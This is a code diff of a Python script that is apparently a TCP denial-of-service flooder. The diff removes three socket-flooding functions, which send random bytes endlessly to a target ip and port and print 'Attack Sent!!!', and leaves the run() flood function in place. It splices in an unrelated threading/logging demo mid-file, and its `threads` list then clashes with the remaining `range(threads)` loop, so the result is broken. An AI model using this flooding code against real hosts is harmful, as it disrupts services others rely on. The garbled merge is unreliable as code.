@@ -1,4 +1,5 @@
 # -*- coding: utf-8 -*-
+import logging
 import random
 import socket
 import threading
@@ -79,57 +80,29 @@ def run():
 		except:
 			print("[-] \033[97mError!!!\033[0m")
 
+def thread_function(name):
+    logging.info("Thread %s: starting", name)
+    time.sleep(2)
+    logging.info("Thread %s: finishing", name)
 
-def run2():
-	data = random._urandom(999)
-	i = random.choice(("[+]"))
-	while true:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +"Attack Sent!!!")
-		except:
-			s.close()
-			print("[-] Error!!!")
-            
+if __name__ == "__main__":
+    format = "%(asctime)s: %(message)s"
+    logging.basicConfig(format=format, level=logging.INFO,
+                        datefmt="%H:%M:%S")
 
-def run3():
-	data = random._urandom(818)
-	i = random.choice(("[+]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +"Attack Sent!!!")
-		except:
-			s.close()
-			print("[-] Error!!!")
-            
-  
-def run4():
-	data = random._urandom(16)
-	i = random.choice(("[+]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +"Attack Sent!!!")
-		except:
-			s.close()
-			print("[-] Error!!!")
+    threads = list()
+    for index in range(3):
+        logging.info("Main    : create and start thread %d.", index)
+        x = threading.Thread(target=thread_function, args=(index,) ,  daemon=True)
+        threads.append(x)
+        x.start()
 
+    for index, thread in enumerate(threads):
+        logging.info("Main    : before joining thread %d.", index)
+        thread.join()
+        logging.info("Main    : thread %d done", index)
+	
 
-											
-            
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
